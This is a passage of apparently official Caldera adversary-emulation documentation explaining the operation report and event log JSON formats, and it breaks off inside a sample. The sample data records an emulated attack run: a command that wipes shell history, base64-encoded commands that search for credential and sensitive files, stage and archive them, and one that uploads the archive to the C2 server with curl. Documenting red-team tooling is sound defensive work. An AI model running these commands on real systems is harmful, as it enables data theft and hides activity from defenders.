# Operation Results

The "Operations" tab enables users to view past operations, create new operations, and export operation reports in `JSON` or `csv` format.  When starting a new operation, the "Operations" tab UI provides information on which commands are executed, their status as recorded by the Caldera C2 server, and the captured `stdout` and `stderr` as applicable.

After completing an operation, you can explore the operations setup, progress, and execution graph using the "Debrief" plugin. Debrief also provides executive-level overviews of the operations progress and the attacks success as a `PDF` report.

After an operation runs, you can export the results in two different `JSON` formats: an operation report or operation event logs.  Both are rich sources of information on the technical specifics of which commands were executed, at what time, and with what result.  The event logs report ability-level execution records, while the operation report covers a broader range of target, contact, and planning information.  The structures of each are compared in the [Operation Report](#operation-report) and [Event Logs](#operation-event-logs) sections.

## Operation Report

The operation report JSON consists of a single dictionary with the following keys and values:
- `name`: String representing the name of the operation
- `host_group`: JSON list of dictionary objects containing information about an agent in the operation. 
- `start`: String representing the operation start time in YYYY-MM-DD HH:MM:SS format.
- `steps`: nested JSON dict that maps agent paw strings to an inner dict which maps the string key `steps` to a list of dict objects. Each innermost dict contains information about a step that the agent took during the operation:
    - `link_id`: String representing the UUID of the executed link.
    - `ability_id`: String representing the UUID of the corresponding ability for the command. (e.g. `90c2efaa-8205-480d-8bb6-61d90dbaf81b`)
    - `command`: String containing the base64 encoding of the command that was run.
    - `delegated`: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the operation made the link available for collection
    - `run`: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the agent submitted the execution results for the command.
    - `status`: Int representing the status code for the command.
    - `platform`: String representing the operating system on which the command was run.
    - `executor`: String representing which agent executor was used for the command (e.g. `psh` for PowerShell).
    - `pid`: Int representing the process ID for running the command.
    - `description`: String representing the command description, taken from the corresponding ability description.
    - `name`: String representing the command nae, taken from the corresponding ability name.
    - `attack`: JSON dict containing ATT&CK-related information for the command, based on the ATT&CK information provided by the corresponding ability:
        - `tactic`: ATT&CK tactic for the command ability.
        - `technique_name`: Full ATT&CK technique name for the command.
        - `technique_id`: ATT&CK technique ID for the command (e.g. `T1005`)
    - `output`: optional field. JSON dict containing the output generated when running the command. Only appears if the user selected the `include agent output` option when downloading the report.
        - `stdout`: Standard output from the command that was run.
        - `stderr`: Standard error from the command that was run.
        - `exit_code`: Exit code returned from the command that was run.
- `finish`: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the operation finished.
- `planner`: Name of the planner used for the operation.
- `adversary`: JSON dict containing information about the adversary used in the operation
    - `atomic_ordering`: List of strings that contain the ability IDs for the adversary.
    - `objective`: objective UUID string for the adversary.
    - `tags`: List of adversary tags
    - `has_repeatable_abilities`: A boolean flag indicating if any ability in the adversary is repeatable.
    - `name`: Adversary name
    - `description`: Adversary description
    - `plugin`: The adversary's source plugin (e.g. `stockpile`)
    - `adversary_id`: Adversary UUID string
- `jitter`: String containing the min/max jitter values.
- `objectives`: JSON dict containing information about the operation objective.
- `facts`: list of dict objects, where each dict represents a fact used or collected in the operation.
    - `origin_type`: String representation of the fact's origin (e.g. `SEEDED` if seeded by the operation's fact source or `LEARNED` if the fact was learned during execution of the operation)
    - `created`: String representing the fact creation time in YYYY-MM-DD HH:MM:SS format
    - `name`: String representation of the fact's name in major to minor format (e.g. `file.sensitive.extension` for a sensitive file extension) 
    - `source`: A string representing the UUID of the fact source containing this fact
    - `score`: Integer representing the fact score
    - `value`: A string representing the fact's value (e.g. a fact named `file.sensitive.extension` may have a value `yml`)
    - `links`: A list of string-valued link UUID which generated this fact
    - `limit_count`: Integer representing the maximum number of occurrences this fact can have in the fact source, defaults to `-1`
    - `technique_id`: ATT&CK technique ID for the command (e.g. `T1005`)
    - `relationships`: list of string-valued fact relationships for facts with this name and value (e.g. `host.file.path(/Users/foo/bar.yml) : has_extension : file.sensitive.extension(yml))`)
    - `trait`: A string representing the fact's trait, or the information the fact seeks to store and capture (e.g. `file.sensitive.extension`)
    - `collected_by`: A list of string-valued agent UUIDs which collected this fact.
    - `unique`: A string representing the fact's unique value (e.g. `file.sensitive.extensionyml`)
- `skipped_abilities`: list of JSON dicts that map an agent paw to a list of inner dicts, each representing a skipped ability.
    - `reason`: Indicates why the ability was skipped (e.g. `Wrong Platform`)
    - `reason_id`: ID number for the reason why the ability was skipped.
    - `ability_id`: UUID string for the skipped ability
    - `ability_name`: Name of the skipped ability.

To download an operation report manually, users can click the "Download Report" button under the operation drop-down list in the operation modal. To include the command output, select the `include agent output` checkbox.

Below is an example operation report JSON:

### Sample Operation Report

```json
{
  "adversary": {
    "adversary_id": "1a98b8e6-18ce-4617-8cc5-e65a1a9d490e",
    "atomic_ordering": [
      "6469befa-748a-4b9c-a96d-f191fde47d89",
      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
      "4e97e699-93d7-4040-b5a3-2e906a58199e",
      "300157e5-f4ad-4569-b533-9d1fa0e74d74",
      "ea713bc4-63f0-491c-9a6f-0b01d560b87e"
    ],
    "description": "An adversary to steal sensitive files",
    "has_repeatable_abilities": false,
    "name": "Thief",
    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
    "plugin": "stockpile",
    "tags": []
  },
  "facts": [
    {
      "collected_by": [],
      "created": "2022-05-11T22:07:07Z",
      "limit_count": -1,
      "links": [
        "fa7ac865-004d-4296-9d68-fd425a481b5e"
      ],
      "name": "file.sensitive.extension",
      "origin_type": "SEEDED",
      "relationships": [
        "host.file.path(/Users/foo/bar/sensitive.sql) : has_extension : file.sensitive.extension(sql)"
      ],
      "score": 6,
      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
      "technique_id": "",
      "trait": "file.sensitive.extension",
      "unique": "file.sensitive.extensionsql",
      "value": "sql"
    },
    {
      "collected_by": [],
      "created": "2022-05-11T22:07:07Z",
      "limit_count": -1,
      "links": [
        "ddf2aa96-24a1-4e71-8360-637a821b0781"
      ],
      "name": "file.sensitive.extension",
      "origin_type": "SEEDED",
      "relationships": [
        "host.file.path(/Users/foo/bar/credentials.yml) : has_extension : file.sensitive.extension(yml)"
      ],
      "score": 6,
      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
      "technique_id": "",
      "trait": "file.sensitive.extension",
      "unique": "file.sensitive.extensionyml",
      "value": "yml"
    },
    {
      "collected_by": [],
      "created": "2022-05-11T22:07:07Z",
      "limit_count": -1,
      "links": [
        "719378af-2f64-4902-9b51-fb506166032f"
      ],
      "name": "file.sensitive.extension",
      "origin_type": "SEEDED",
      "relationships": [
        "host.file.path(/Users/foo/bar/PyTorch Models/myModel.pt) : has_extension : file.sensitive.extension(pt)"
      ],
      "score": 6,
      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
      "technique_id": "",
      "trait": "file.sensitive.extension",
      "unique": "file.sensitive.extensionpt",
      "value": "pt"
    },
    {
      "collected_by": [
        "vrgirx"
      ],
      "created": "2022-05-11T22:07:20Z",
      "limit_count": -1,
      "links": [
        "d52a51ff-b7af-44a1-a2f8-2f2fa68b5c73"
      ],
      "name": "host.dir.staged",
      "origin_type": "LEARNED",
      "relationships": [
        "host.dir.staged(/Users/foo/staged)"
      ],
      "score": 2,
      "source": "3e8c71c1-dfc8-494f-8262-1378e8620791",
      "technique_id": "T1074.001",
      "trait": "host.dir.staged",
      "unique": "host.dir.staged/Users/foo/staged",
      "value": "/Users/foo/staged"
    },
    {
      "collected_by": [
        "vrgirx"
      ],
      "created": "2022-05-11T22:08:56Z",
      "limit_count": -1,
      "links": [
        "719378af-2f64-4902-9b51-fb506166032f"
      ],
      "name": "host.file.path",
      "origin_type": "LEARNED",
      "relationships": [
        "host.file.path(/Users/foo/bar/PyTorch Models/myModel.pt) : has_extension : file.sensitive.extension(pt)"
      ],
      "score": 1,
      "source": "3e8c71c1-dfc8-494f-8262-1378e8620791",
      "technique_id": "T1005",
      "trait": "host.file.path",
      "unique": "host.file.path/Users/foo/bar/PyTorch Models/myModel.pt",
      "value": "/Users/foo/bar/PyTorch Models/myModel.pt"
    },
    {
      "collected_by": [
        "vrgirx"
      ],
      "created": "2022-05-11T22:09:07Z",
      "limit_count": -1,
      "links": [
        "ddf2aa96-24a1-4e71-8360-637a821b0781"
      ],
      "name": "host.file.path",
      "origin_type": "LEARNED",
      "relationships": [
        "host.file.path(/Users/foo/bar/credentials.yml) : has_extension : file.sensitive.extension(yml)"
      ],
      "score": 1,
      "source": "3e8c71c1-dfc8-494f-8262-1378e8620791",
      "technique_id": "T1005",
      "trait": "host.file.path",
      "unique": "host.file.path/Users/foo/bar/credentials.yml",
      "value": "/Users/foo/bar/credentials.yml"
    },
    {
      "collected_by": [
        "vrgirx"
      ],
      "created": "2022-05-11T22:10:45Z",
      "limit_count": -1,
      "links": [
        "fa7ac865-004d-4296-9d68-fd425a481b5e"
      ],
      "name": "host.file.path",
      "origin_type": "LEARNED",
      "relationships": [
        "host.file.path(/Users/foo/bar/sensitive.sql) : has_extension : file.sensitive.extension(sql)"
      ],
      "score": 1,
      "source": "3e8c71c1-dfc8-494f-8262-1378e8620791",
      "technique_id": "T1005",
      "trait": "host.file.path",
      "unique": "host.file.path/Users/foo/bar/sensitive.sql",
      "value": "/Users/foo/bar/sensitive.sql"
    }
  ],
  "finish": "2022-05-11T22:15:04Z",
  "host_group": [
    {
      "architecture": "amd64",
      "available_contacts": [
        "HTTP"
      ],
      "contact": "HTTP",
      "created": "2022-05-11T18:42:02Z",
      "deadman_enabled": true,
      "display_name": "TARGET-PC$foo",
      "exe_name": "splunkd",
      "executors": [
        "proc",
        "sh"
      ],
      "group": "red",
      "host": "TARGET-PC",
      "host_ip_addrs": [
        "192.168.1.3",
        "100.64.0.1"
      ],
      "last_seen": "2022-05-11T22:39:17Z",
      "links": [
        {
          "ability": {
            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
            "access": {},
            "additional_info": {},
            "buckets": [
              "defense-evasion"
            ],
            "delete_payload": true,
            "description": "Stop terminal from logging history",
            "executors": [
              {
                "additional_info": {},
                "build_target": null,
                "cleanup": [],
                "code": null,
                "command": "> $HOME/.bash_history && unset HISTFILE",
                "language": null,
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "platform": "darwin",
                "timeout": 60,
                "uploads": [],
                "variations": []
              },
              {
                "additional_info": {},
                "build_target": null,
                "cleanup": [],
                "code": null,
                "command": "> $HOME/.bash_history && unset HISTFILE",
                "language": null,
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "platform": "linux",
                "timeout": 60,
                "uploads": [],
                "variations": []
              },
              {
                "additional_info": {},
                "build_target": null,
                "cleanup": [],
                "code": null,
                "command": "Clear-History;Clear",
                "language": null,
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "platform": "windows",
                "timeout": 60,
                "uploads": [],
                "variations": []
              }
            ],
            "name": "Avoid logs",
            "plugin": "stockpile",
            "privilege": null,
            "repeatable": false,
            "requirements": [],
            "singleton": false,
            "tactic": "defense-evasion",
            "technique_id": "T1070.003",
            "technique_name": "Indicator Removal on Host: Clear Command History"
          },
          "agent_reported_time": "2022-05-11T18:42:02Z",
          "cleanup": 0,
          "collect": "2022-05-11T18:42:02Z",
          "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
          "deadman": false,
          "decide": "2022-05-11T18:42:02Z",
          "executor": {
            "additional_info": {},
            "build_target": null,
            "cleanup": [],
            "code": null,
            "command": "> $HOME/.bash_history && unset HISTFILE",
            "language": null,
            "name": "sh",
            "parsers": [],
            "payloads": [],
            "platform": "darwin",
            "timeout": 60,
            "uploads": [],
            "variations": []
          },
          "facts": [],
          "finish": "2022-05-11T18:42:02Z",
          "host": "TARGET-PC",
          "id": "be6db169-f88d-46f5-8375-ace0e0b2a0df",
          "jitter": 0,
          "output": {
            "stdout": "False",
            "stderr": "",
            "exit_code": "0"
          },
          "paw": "vrgirx",
          "pid": "14441",
          "pin": 0,
          "relationships": [],
          "score": 0,
          "status": 0,
          "unique": "be6db169-f88d-46f5-8375-ace0e0b2a0df",
          "used": [],
          "visibility": {
            "adjustments": [],
            "score": 50
          }
        }
      ],
      "location": "/Users/foo/splunkd",
      "origin_link_id": "",
      "paw": "vrgirx",
      "pending_contact": "HTTP",
      "pid": 32746,
      "platform": "darwin",
      "ppid": 32662,
      "privilege": "User",
      "proxy_chain": [],
      "proxy_receivers": {},
      "server": "http://0.0.0.0:8888",
      "sleep_max": 60,
      "sleep_min": 30,
      "trusted": true,
      "upstream_dest": "http://0.0.0.0:8888",
      "username": "foo",
      "watchdog": 0
    }
  ],
  "jitter": "2/8",
  "name": "mock_operation_report",
  "objectives": {
    "description": "This is a default objective that runs forever.",
    "goals": [
      {
        "achieved": false,
        "count": 1048576,
        "operator": "==",
        "target": "exhaustion",
        "value": "complete"
      }
    ],
    "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
    "name": "default",
    "percentage": 0
  },
  "planner": "atomic",
  "skipped_abilities": [
    {
      "vrgirx": []
    }
  ],
  "start": "2022-05-11T22:07:07Z",
  "steps": {
    "vrgirx": {
      "steps": [
        {
          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
          "agent_reported_time": "2022-05-11T22:07:20Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1074.001",
            "technique_name": "Data Staged: Local Data Staging"
          },
          "command": "bWtkaXIgLXAgc3RhZ2VkICYmIGVjaG8gJFBXRC9zdGFnZWQ=",
          "delegated": "2022-05-11T22:07:07Z",
          "description": "create a directory for exfil staging",
          "executor": "sh",
          "link_id": "d52a51ff-b7af-44a1-a2f8-2f2fa68b5c73",
          "name": "Create staging directory",
          "output": {
            "stdout": "/Users/foo/staged",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 56272,
          "platform": "darwin",
          "run": "2022-05-11T22:07:20Z",
          "status": 0
        },
        {
          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
          "agent_reported_time": "2022-05-11T22:08:02Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1005",
            "technique_name": "Data from Local System"
          },
          "command": "ZmluZCAvVXNlcnMgLW5hbWUgJyoucHQnIC10eXBlIGYgLW5vdCAtcGF0aCAnKi9cLionIC1zaXplIC01MDBrIDI+L2Rldi9udWxsIHwgaGVhZCAtNQ==",
          "delegated": "2022-05-11T22:07:22Z",
          "description": "Locate files deemed sensitive",
          "executor": "sh",
          "link_id": "719378af-2f64-4902-9b51-fb506166032f",
          "name": "Find files",
          "output": {
            "stdout": "/Users/foo/bar/PyTorch\\ Models/myModel.pt",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 56376,
          "platform": "darwin",
          "run": "2022-05-11T22:08:56Z",
          "status": 0
        },
        {
          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
          "agent_reported_time": "2022-05-11T22:09:02Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1005",
            "technique_name": "Data from Local System"
          },
          "command": "ZmluZCAvVXNlcnMgLW5hbWUgJyoueW1sJyAtdHlwZSBmIC1ub3QgLXBhdGggJyovXC4qJyAtc2l6ZSAtNTAwayAyPi9kZXYvbnVsbCB8IGhlYWQgLTU=",
          "delegated": "2022-05-11T22:08:57Z",
          "description": "Locate files deemed sensitive",
          "executor": "sh",
          "link_id": "ddf2aa96-24a1-4e71-8360-637a821b0781",
          "name": "Find files",
          "output": {
            "stdout": "/Users/foo/bar/credentials.yml",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 56562,
          "platform": "darwin",
          "run": "2022-05-11T22:09:07Z",
          "status": 0
        },
        {
          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
          "agent_reported_time": "2022-05-11T22:09:53Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1005",
            "technique_name": "Data from Local System"
          },
          "command": "ZmluZCAvVXNlcnMgLW5hbWUgJyouc3FsJyAtdHlwZSBmIC1ub3QgLXBhdGggJyovXC4qJyAtc2l6ZSAtNTAwayAyPi9kZXYvbnVsbCB8IGhlYWQgLTU=",
          "delegated": "2022-05-11T22:09:12Z",
          "description": "Locate files deemed sensitive",
          "executor": "sh",
          "link_id": "fa7ac865-004d-4296-9d68-fd425a481b5e",
          "name": "Find files",
          "output": {
            "stdout": "/Users/foo/bar/sensitive.sql",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 56809,
          "platform": "darwin",
          "run": "2022-05-11T22:10:45Z",
          "status": 0
        },
        {
          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
          "agent_reported_time": "2022-05-11T22:10:55Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1074.001",
            "technique_name": "Data Staged: Local Data Staging"
          },
          "command": "Y3AgIi9Vc2Vycy9jamVsbGVuL0RvY3VtZW50cy9kZW1vL1B5VG9yY2hcIE1vZGVscy9teU1vZGVsLW5pZ2h0bHkucHQiIC9Vc2Vycy9jamVsbGVuL3N0YWdlZA==",
          "delegated": "2022-05-11T22:10:47Z",
          "description": "copy files to staging directory",
          "executor": "sh",
          "link_id": "4a55c2c9-eb9d-4e31-b2b6-8bb4b4ab2950",
          "name": "Stage sensitive files",
          "output": {
            "stdout": "",
            "stderr": "cp: /Users/foo/bar/PyTorch\\ Models/myModel.pt: No such file or directory",
            "exit_code": "1"
          },
          "pid": 57005,
          "platform": "darwin",
          "run": "2022-05-11T22:10:55Z",
          "status": 1
        },
        {
          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
          "agent_reported_time": "2022-05-11T22:11:34Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1074.001",
            "technique_name": "Data Staged: Local Data Staging"
          },
          "command": "Y3AgIi9Vc2Vycy9jamVsbGVuL29wdC9hbmFjb25kYTMvZW52cy9mYWlyL2xpYi9weXRob24zLjgvc2l0ZS1wYWNrYWdlcy9zYWNyZW1vc2VzL2RhdGEvbm9uYnJlYWtpbmdfcHJlZml4ZXMvbm9uYnJlYWtpbmdfcHJlZml4LnB0IiAvVXNlcnMvY2plbGxlbi9zdGFnZWQ=",
          "delegated": "2022-05-11T22:10:57Z",
          "description": "copy files to staging directory",
          "executor": "sh",
          "link_id": "a5ef6774-6eed-4383-a769-420092e1ba27",
          "name": "Stage sensitive files",
          "pid": 57105,
          "platform": "darwin",
          "run": "2022-05-11T22:11:34Z",
          "status": 0
        },
        {
          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
          "agent_reported_time": "2022-05-11T22:12:22Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1074.001",
            "technique_name": "Data Staged: Local Data Staging"
          },
          "command": "Y3AgIi9Vc2Vycy9jamVsbGVuL29wdC9hbmFjb25kYTMvbGliL3B5dGhvbjMuOC9zaXRlLXBhY2thZ2VzL3NhY3JlbW9zZXMvZGF0YS9ub25icmVha2luZ19wcmVmaXhlcy9ub25icmVha2luZ19wcmVmaXgucHQiIC9Vc2Vycy9jamVsbGVuL3N0YWdlZA==",
          "delegated": "2022-05-11T22:11:37Z",
          "description": "copy files to staging directory",
          "executor": "sh",
          "link_id": "b2ba877c-2501-4abc-89a0-aeada909f52b",
          "name": "Stage sensitive files",
          "pid": 57294,
          "platform": "darwin",
          "run": "2022-05-11T22:12:22Z",
          "status": 0
        },
        {
          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
          "agent_reported_time": "2022-05-11T22:13:02Z",
          "attack": {
            "tactic": "exfiltration",
            "technique_id": "T1560.001",
            "technique_name": "Archive Collected Data: Archive via Utility"
          },
          "command": "dGFyIC1QIC16Y2YgL1VzZXJzL2NqZWxsZW4vc3RhZ2VkLnRhci5neiAvVXNlcnMvY2plbGxlbi9zdGFnZWQgJiYgZWNobyAvVXNlcnMvY2plbGxlbi9zdGFnZWQudGFyLmd6",
          "delegated": "2022-05-11T22:12:27Z",
          "description": "Compress a directory on the file system",
          "executor": "sh",
          "link_id": "795b4b12-1355-49ea-96e8-f6d3d045334d",
          "name": "Compress staged directory",
          "output": {
            "stdout": "/Users/foo/staged.tar.gz",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 57383,
          "platform": "darwin",
          "run": "2022-05-11T22:13:02Z",
          "status": 0
        },
        {
          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
          "agent_reported_time": "2022-05-11T22:14:02Z",
          "attack": {
            "tactic": "exfiltration",
            "technique_id": "T1041",
            "technique_name": "Exfiltration Over C2 Channel"
          },
          "command": "Y3VybCAtRiAiZGF0YT1AL1VzZXJzL2NqZWxsZW4vc3RhZ2VkLnRhci5neiIgLS1oZWFkZXIgIlgtUmVxdWVzdC1JRDogYGhvc3RuYW1lYC12cmdpcngiIGh0dHA6Ly8wLjAuMC4wOjg4ODgvZmlsZS91cGxvYWQ=",
          "delegated": "2022-05-11T22:13:07Z",
          "description": "Exfil the staged directory",
          "executor": "sh",
          "link_id": "bda3e573-d751-420b-8740-d4a36cee1f9d",
          "name": "Exfil staged directory",
          "output": {
            "stdout": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100  1357    0     0  100  1357      0   441k --:--:-- --:--:-- --:--:--  441k",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 57568,
          "platform": "darwin",
          "run": "2022-05-11T22:14:02Z",
          "status": 0
        },
        {
          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
          "agent_reported_time": "2022-05-11T22:15:01Z",
          "attack": {
            "tactic": "exfiltration",
            "technique_id": "T1560.001",
            "technique_name": "Archive Collected Data: Archive via Utility"
          },
          "command": "cm0gL1VzZXJzL2NqZWxsZW4vc3RhZ2VkLnRhci5neg==",
          "delegated": "2022-05-11T22:14:07Z",
          "description": "Compress a directory on the file system",
          "executor": "sh",
          "link_id": "e58dc3e6-b3a2-4657-aba0-f2f719a35041",
          "name": "Compress staged directory",
          "pid": 57769,
          "platform": "darwin",
          "run": "2022-05-11T22:15:01Z",
          "status": 0
        },
        {
          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
          "agent_reported_time": "2022-05-11T22:15:03Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1074.001",
            "technique_name": "Data Staged: Local Data Staging"
          },
          "command": "cm0gLXJmIHN0YWdlZA==",
          "delegated": "2022-05-11T22:14:07Z",
          "description": "create a directory for exfil staging",
          "executor": "sh",
          "link_id": "cdd17a43-2e06-4be4-b361-c3291cdb3f6a",
          "name": "Create staging directory",
          "pid": 57773,
          "platform": "darwin",
          "run": "2022-05-11T22:15:03Z",
          "status": 0
        }
      ]
    }
  }
}
```

## Operation Event Logs

The operation event logs JSON file can be downloaded via the `Download event logs` button on the operations modal after selecting an operation from the drop-down menu. To include command output, users should select the `include agent output` option. Operation event logs will also be automatically written to disk when an operation completes - see the section on [automatic event log generation](#automatic-event-log-generation).

The event logs JSON is a list of dictionary objects, where each dictionary represents an event that occurred during the operation (i.e. each link/command). Users can think of this as a "flattened" version of the operation steps displayed in the traditional report JSON format. However, not all of the operation or agent metadata from the operation report is included in the operation event logs. The event logs do not include operation facts, nor do they include operation links/commands that were skipped either manually or because certain requirements were not met (e.g. missing facts or insufficient privileges). The event log JSON format makes it more convenient to import into databases or SIEM tools.

The event dictionary has the following keys and values:
- `command`: base64-encoded command that was executed
- `delegated_timestamp`: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the operation made the link available for collection
- `collected_timestamp`: Timestamp in YYYY-MM-DD HH:MM:SS format that indicates when the agent collected the link available for collection
- `finished_timestamp`: Timestamp in YYYY-MM-DD HH:MM:SS format that indicates when the agent submitted the link execution results to the C2 server.
- `status`: link execution status
- `platform`: target platform for the agent running the link (e.g. "windows")
- `executor`: executor used to run the link command (e.g. "psh" for powershell)
- `pid`: process ID for the link
- `agent_metadata`: dictionary containing the following information for the agent that ran the link:
    - `paw`
    - `group`
    - `architecture`
    - `username`
    - `location`
    - `pid`
    - `ppid`
    - `privilege`
    - `host`
    - `contact`
    - `created`
- `ability_metadata`: dictionary containing the following information about the link ability:
    - `ability_id`
    - `ability_name`
    - `ability_description`
- `operation_metadata`: dictionary containing the following information about the operation that generated the link event:
    - `operation_name`
    - `operation_start`: operation start time in YYYY-MM-DD HH:MM:SS format
    - `operation_adversary`: name of the adversary used in the operation
- `attack_metadata`: dictionary containing the following ATT&CK information for the ability associated with the link:
    - `tactic`
    - `technique_id`
    - `technique_name`
- `output`: if the user selected `include agent output` when downloading the operation event logs, this field will contain a dictionary of the agent-provided output from running the link command.
    - `stdout`
    - `stderr`
    - `exit_code`
- `agent_reported_time`: Timestamp string representing the time at which the execution was ran by the agent in YYYY-MM-DD HH:MM:SS format. This field will not be present if the agent does not support reporting the command execution time.

Below is a sample output for operation event logs:

### Sample Event Logs

```json
[
  {
    "command": "R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLnBuZyAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7",
    "delegated_timestamp": "2021-02-23T11:50:12Z",
    "collected_timestamp": "2021-02-23T11:50:14Z",
    "finished_timestamp": "2021-02-23T11:50:14Z",
    "status": 0,
    "platform": "windows",
    "executor": "psh",
    "pid": 7016,
    "agent_metadata": {
      "paw": "pertbn",
      "group": "red",
      "architecture": "amd64",
      "username": "BYZANTIUM\\Carlomagno",
      "location": "C:\\Users\\Public\\sandcat.exe",
      "pid": 5896,
      "ppid": 2624,
      "privilege": "Elevated",
      "host": "WORKSTATION1",
      "contact": "HTTP",
      "created": "2021-02-23T11:48:33Z"
    },
    "ability_metadata": {
      "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
      "ability_name": "Find files",
      "ability_description": "Locate files deemed sensitive"
    },
    "operation_metadata": {
      "operation_name": "My Operation",
      "operation_start": "2021-02-23T11:50:12Z",
      "operation_adversary": "Collection"
    },
    "attack_metadata": {
      "tactic": "collection",
      "technique_name": "Data from Local System",
      "technique_id": "T1005"
    },
    "agent_reported_time": "2021-02-23T11:50:13Z"
  },
  {
    "command": "R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLnltbCAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7",
    "delegated_timestamp": "2021-02-23T11:50:17Z",
    "collected_timestamp": "2021-02-23T11:50:21Z",
    "finished_timestamp": "2021-02-23T11:50:21Z",
    "status": 0,
    "platform": "windows",
    "executor": "psh",
    "pid": 1048,
    "agent_metadata": {
      "paw": "pertbn",
      "group": "red",
      "architecture": "amd64",
      "username": "BYZANTIUM\\Carlomagno",
      "location": "C:\\Users\\Public\\sandcat.exe",
      "pid": 5896,
      "ppid": 2624,
      "privilege": "Elevated",
      "host": "WORKSTATION1",
      "contact": "HTTP",
      "created": "2021-02-23T11:48:33Z"
    },
    "ability_metadata": {
      "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
      "ability_name": "Find files",
      "ability_description": "Locate files deemed sensitive"
    },
    "operation_metadata": {
      "operation_name": "My Operation",
      "operation_start": "2021-02-23T11:50:12Z",
      "operation_adversary": "Collection"
    },
    "attack_metadata": {
      "tactic": "collection",
      "technique_name": "Data from Local System",
      "technique_id": "T1005"
    },
    "agent_reported_time": "2021-02-23T11:50:18Z"
  },
  {
    "command": "R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLndhdiAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7",
    "delegated_timestamp": "2021-02-23T11:50:22Z",
    "collected_timestamp": "2021-02-23T11:50:27Z",
    "finished_timestamp": "2021-02-23T11:50:27Z",
    "status": 0,
    "platform": "windows",
    "executor": "psh",
    "pid": 5964,
    "agent_metadata": {
      "paw": "pertbn",
      "group": "red",
      "architecture": "amd64",
      "username": "BYZANTIUM\\Carlomagno",
      "location": "C:\\Users\\Public\\sandcat.exe",
      "pid": 5896,
      "ppid": 2624,
      "privilege": "Elevated",
      "host": "WORKSTATION1",
      "contact": "HTTP",
      "created": "2021-02-23T11:48:33Z"
    },
    "ability_metadata": {
      "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
      "ability_name": "Find files",
      "ability_description": "Locate files deemed sensitive"
    },
    "operation_metadata": {
      "operation_name": "My Operation",
      "operation_start": "2021-02-23T11:50:12Z",
      "operation_adversary": "Collection"
    },
    "attack_metadata": {
      "tactic": "collection",
      "technique_name": "Data from Local System",
      "technique_id": "T1005"
    },
    "agent_reported_time": "2021-02-23T11:50:25Z"
  },
  {
    "command": "TmV3LUl0ZW0gLVBhdGggIi4iIC1OYW1lICJzdGFnZWQiIC1JdGVtVHlwZSAiZGlyZWN0b3J5IiAtRm9yY2UgfCBmb3JlYWNoIHskXy5GdWxsTmFtZX0gfCBTZWxlY3QtT2JqZWN0",
    "delegated_timestamp": "2021-02-23T11:50:32Z",
    "collected_timestamp": "2021-02-23T11:50:37Z",
    "finished_timestamp": "2021-02-23T11:50:37Z",
    "status": 0,
    "platform": "windows",
    "executor": "psh",
    "pid": 3212,
    "agent_metadata": {
      "paw": "pertbn",
      "group": "red",
      "architecture": "amd64",
      "username": "BYZANTIUM\\Carlomagno",
      "location": "C:\\Users\\Public\\sandcat.exe",
